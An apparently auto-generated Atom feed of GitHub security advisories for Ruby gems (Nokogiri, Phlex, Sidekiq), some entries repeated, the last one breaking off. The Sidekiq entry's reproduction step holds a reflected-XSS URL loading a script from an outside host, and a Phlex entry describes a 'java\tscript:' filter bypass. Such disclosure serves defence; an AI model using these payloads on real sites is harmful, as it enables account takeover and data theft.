<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2024-05-15T11:01:28.511Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Nokogiri updates packaged libxml2 to v2.12.7 to resolve CVE-2024-34459]]></title>
        <id>https://github.com/advisories/GHSA-r3w4-36x6-7r99</id>
        <link href="https://github.com/advisories/GHSA-r3w4-36x6-7r99"/>
        <updated>2024-05-14T22:30:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Nokogiri v1.16.5 upgrades its dependency libxml2 to
<a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.12.7">2.12.7</a> from 2.12.6.</p>
<p>libxml2 v2.12.7 addresses CVE-2024-34459:</p>
<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li>patched by <a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>
</ul>
<h2 id="impact">Impact</h2>
<p>There is no impact to Nokogiri users because the issue is present only
in libxml2's <code>xmllint</code> tool which Nokogiri does not provide or expose.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>2024-05-13 05:57 EDT, libxml2 2.12.7 release is announced</li>
<li>2024-05-13 08:30 EDT, nokogiri maintainers begin triage</li>
<li>2024-05-13 10:05 EDT, nokogiri <a href="https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5">v1.16.5 is released</a>
and this GHSA made public</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li><a href="https://github.com/advisories/GHSA-r3w4-36x6-7r99">https://github.com/advisories/GHSA-r3w4-36x6-7r99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3w4-36x6-7r99</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-14T22:30:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Nokogiri updates packaged libxml2 to v2.12.7 to resolve CVE-2024-34459]]></title>
        <id>https://github.com/advisories/GHSA-r95h-9x8f-r3f7</id>
        <link href="https://github.com/advisories/GHSA-r95h-9x8f-r3f7"/>
        <updated>2024-05-13T16:05:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Nokogiri v1.16.5 upgrades its dependency libxml2 to <a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.12.7">2.12.7</a> from 2.12.6.</p>
<p>libxml2 v2.12.7 addresses CVE-2024-34459:</p>
<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li>patched by <a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>
</ul>
<h2 id="impact">Impact</h2>
<p>There is no impact to Nokogiri users because the issue is present only in libxml2's <code>xmllint</code> tool which Nokogiri does not provide or expose.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>2024-05-13 05:57 EDT, libxml2 2.12.7 release is announced</li>
<li>2024-05-13 08:30 EDT, nokogiri maintainers begin triage</li>
<li>2024-05-13 10:05 EDT, nokogiri <a href="https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5">v1.16.5 is released</a> and this GHSA made public</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7</a></li>
<li><a href="https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5">https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li><a href="https://github.com/advisories/GHSA-r95h-9x8f-r3f7">https://github.com/advisories/GHSA-r95h-9x8f-r3f7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r95h-9x8f-r3f7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-13T16:05:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Phlex vulnerable to Cross-site Scripting (XSS) via maliciously formed HTML attribute names and values]]></title>
        <id>https://github.com/advisories/GHSA-9p57-h987-4vgx</id>
        <link href="https://github.com/advisories/GHSA-9p57-h987-4vgx"/>
        <updated>2024-05-03T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>The reason these issues were not detected before is the escapes were working as designed. However, their design didn't take into account just how recklessly permissive browser are when it comes to executing unsafe JavaScript via HTML attributes.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<p>If you splat user-provided attributes when rendering any HTML or SVG tag, malicious event attributes could be included in the output, executing JavaScript when the events are triggered by another user.</p>
<pre><code class="language-ruby">h1(**JSON.parse(user_attributes))
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patches are <a href="https://rubygems.org/gems/phlex">available on RubyGems</a> for all minor versions released in the last year.</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">1.9.3</a></li>
</ul>
<p>If you are on <code>main</code>, it has been patched since <a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2"><code>da8f943</code></a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<p>In addition to upgrading to a patched version of Phlex, we strongly recommend configuring a Content Security Policy header that does not allow <code>unsafe-inline</code>. Hereâ€™s how you can configure a Content Security Policy header in Rails. <a href="https://guides.rubyonrails.org/security.html#content-security-policy-header">https://guides.rubyonrails.org/security.html#content-security-policy-header</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32970">https://nvd.nist.gov/vuln/detail/CVE-2024-32970</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2">https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></li>
<li><a href="https://rubygems.org/gems/phlex">https://rubygems.org/gems/phlex</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">https://rubygems.org/gems/phlex/versions/1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">https://rubygems.org/gems/phlex/versions/1.9.3</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-9p57-h987-4vgx">https://github.com/advisories/GHSA-9p57-h987-4vgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9p57-h987-4vgx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T16:37:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Phlex vulnerable to Cross-site Scripting (XSS) via maliciously formed HTML attribute names and values]]></title>
        <id>https://github.com/advisories/GHSA-9p57-h987-4vgx</id>
        <link href="https://github.com/advisories/GHSA-9p57-h987-4vgx"/>
        <updated>2024-05-03T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>The reason these issues were not detected before is the escapes were working as designed. However, their design didn't take into account just how recklessly permissive browser are when it comes to executing unsafe JavaScript via HTML attributes.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<p>If you splat user-provided attributes when rendering any HTML or SVG tag, malicious event attributes could be included in the output, executing JavaScript when the events are triggered by another user.</p>
<pre><code class="language-ruby">h1(**JSON.parse(user_attributes))
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patches are <a href="https://rubygems.org/gems/phlex">available on RubyGems</a> for all minor versions released in the last year.</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">1.9.3</a></li>
</ul>
<p>If you are on <code>main</code>, it has been patched since <a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2"><code>da8f943</code></a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<p>In addition to upgrading to a patched version of Phlex, we strongly recommend configuring a Content Security Policy header that does not allow <code>unsafe-inline</code>. Hereâ€™s how you can configure a Content Security Policy header in Rails. <a href="https://guides.rubyonrails.org/security.html#content-security-policy-header">https://guides.rubyonrails.org/security.html#content-security-policy-header</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32970">https://nvd.nist.gov/vuln/detail/CVE-2024-32970</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2">https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></li>
<li><a href="https://rubygems.org/gems/phlex">https://rubygems.org/gems/phlex</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">https://rubygems.org/gems/phlex/versions/1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">https://rubygems.org/gems/phlex/versions/1.9.3</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-9p57-h987-4vgx">https://github.com/advisories/GHSA-9p57-h987-4vgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9p57-h987-4vgx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T16:37:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sidekiq] sidekiq vulnerable to cross-site scripting ]]></title>
        <id>https://github.com/advisories/GHSA-h3r8-h5qw-4r35</id>
        <link href="https://github.com/advisories/GHSA-h3r8-h5qw-4r35"/>
        <updated>2024-05-01T13:15:10.000Z</updated>
        <content type="html"><![CDATA[<p>sidekiq from 7.0.4 to 7.0.7 is vulnerable to reflected cross-site scripting. A fix was released in version 7.0.8.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1892">https://nvd.nist.gov/vuln/detail/CVE-2023-1892</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214">https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214</a></li>
<li><a href="https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777">https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/blob/main/Changes.md#708">https://github.com/sidekiq/sidekiq/blob/main/Changes.md#708</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2023-1892.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2023-1892.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-h3r8-h5qw-4r35">https://github.com/advisories/GHSA-h3r8-h5qw-4r35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h3r8-h5qw-4r35</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-04-21T06:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sidekiq] Sidekiq vulnerable to a Reflected XSS in Queues Web Page]]></title>
        <id>https://github.com/advisories/GHSA-q655-3pj8-9fxq</id>
        <link href="https://github.com/advisories/GHSA-q655-3pj8-9fxq"/>
        <updated>2024-05-01T13:02:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description:</h3>
<p>During the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of substr parameter is reflected in the response without any encoding, allowing an attacker to inject Javascript code into the response of the application. </p>
<p>This vulnerability can be exploited to target the users of the application, and users of other applications deployed on the same domain or website as that of the Sidekiq website. Successful exploit results may result in compromise of user accounts and user data.</p>
<h3 id="impact">Impact:</h3>
<p>The impact of this vulnerability can be severe. An attacker could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or website as Sidekiq, users of those applications could also be affected, leading to a broader scope of compromise. Potentially compromising their accounts, forcing the users to perform sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web application, etc.</p>
<h3 id="mitigation">Mitigation:</h3>
<p>Encode all output data before rendering it in the response to prevent XSS attacks.</p>
<h3 id="steps-to-reproduce">Steps to Reproduce:</h3>
<ol>
<li>Go to the following URL of the sidekiq Web UI: 
https://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22<a href="https://cheemahq.vercel.app/a.js%22%20/%3E">https://cheemahq.vercel.app/a.js%22%20/%3E</a></li>
<li>XSS payload will be executed, causing a popup.</li>
</ol>
<h3 id="evidence">Evidence:</h3>
<p><img alt="image" src="https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e">
Figure 1: Source Code Vulnerable to XSS</p>
<p><img alt="image" src="https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85">
Figure 2: XSS payload triggered</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq">https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32887">https://nvd.nist.gov/vuln/detail/CVE-2024-32887</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d">https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4">https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-q655-3pj8-9fxq">https://github.com/advisories/GHSA-q655-3pj8-9fxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q655-3pj8-9fxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-26T22:19:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
